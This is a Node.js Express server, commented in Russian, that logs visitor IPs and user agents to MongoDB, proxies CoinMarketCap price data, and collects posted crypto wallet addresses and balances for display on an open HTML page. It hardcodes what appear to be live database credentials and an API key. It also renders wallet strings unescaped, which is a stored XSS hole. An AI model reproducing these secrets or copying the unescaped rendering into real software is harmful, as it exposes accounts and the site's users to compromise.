import express from "express";
import request from "request";
import mongoose from "mongoose";

const app = express();
const port = 3000;

// Подключение к MongoDB Atlas
mongoose.connect(
  "mongodb+srv://zambros777:6ymuogPM2RCggsqQ@cluster0.jtamd.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
);

// Определение схемы для логов посещений
const visitLogSchema = new mongoose.Schema({
  userAgent: String,
  ip: String,
  entryDate: Date,
});

const VisitLog = mongoose.model("VisitLog", visitLogSchema);

// Middleware для обработки CORS и JSON
app.use(express.json());

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.header("X-Content-Type-Options", "nosniff");
  res.header("X-Frame-Options", "DENY");  // Защита от clickjacking
  res.header("X-XSS-Protection", "1; mode=block");  // Защита от XSS
  next();
});






// Временное хранилище пользователей
let walletData = [];

// Логирование визита
app.post("/api/user-info", async (req, res) => {
  try {
    const { userAgent, ip, entryDate } = req.body;

    const visit = new VisitLog({
      userAgent,
      ip,
      entryDate: new Date(entryDate),
    });

    await visit.save();
    res.status(200).send("Visit logged successfully");
  } catch (error) {
    res.status(500).send("Error logging visit: " + error.message);
  }
});

// Эндпоинт для получения данных о криптовалюте
app.get("/api/crypto", (req, res) => {
  const url = `https://pro-api.coinmarketcap.com/v1/cryptocurrency/quotes/latest?symbol=${req.query.symbol}&convert=${req.query.convert}`;
  request(
    {
      url: url,
      headers: {
        "X-CMC_PRO_API_KEY": "73123050-db8f-430f-9815-0ea4367ced21",
      },
    },
    (error, response, body) => {
      if (error) {
        res.status(500).send(error);
      } else {
        res.send(body);
      }
    }
  );
});

app.post("/api/wallet-balance", (req, res) => {
  const { wallet, balance } = req.body;

  if (!wallet || typeof balance !== "number") {
    return res.status(400).send("Invalid data.");
  }

  const walletIndex = walletData.findIndex(
    (entry) => entry.wallet.toLowerCase() === wallet.toLowerCase()
  );

  if (walletIndex !== -1) {
    walletData[walletIndex].balance = balance;
    res.send(`Обновлен кошелек: ${wallet} с новым балансом: ${balance}`);
  } else {
    walletData.push({ wallet, balance });
    res.send(`Добавлен новый кошелек: ${wallet} с балансом: ${balance}`);
  }
});

app.get("/api/view-balances", (req, res) => {
  const tableRows = walletData
    .map(
      (entry) => `
        <tr>
          <td style="padding: 8px; border-bottom: 1px solid #ddd;">${entry.wallet}</td>
          <td style="padding: 8px; border-bottom: 1px solid #ddd;">${entry.balance} USDT</td>
        </tr>`
    )
    .join("");

  const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Wallet Balances</title>
      <style>
        body {
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          margin: 0;
          font-family: "Roboto", sans-serif;
          background-color: #f5f5f5;
        }
        table {
          border-collapse: collapse;
          width: 60%;
          margin-top: 50px;
          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
          background-color: #fff;
        }
        th {
          padding: 12px;
          text-align: left;
          background-color: #3f51b5;
          color: white;
          font-size: 18px;
        }
        td {
          padding: 12px;
          border-bottom: 1px solid #ddd;
        }
        tr:hover {
          background-color: #f1f1f1;
        }
      </style>
    </head>
    <body>
      <table>
        <tr>
          <th>Wallet Address</th>
          <th>Balance</th>
        </tr>
        ${tableRows}
      </table>
    </body>
    </html>
  `;

  res.send(html);
});

// Запуск сервера для локального тестирования
app.listen(port, () => {
  console.log(`Proxy server is running at http://localhost:${port}`);
});
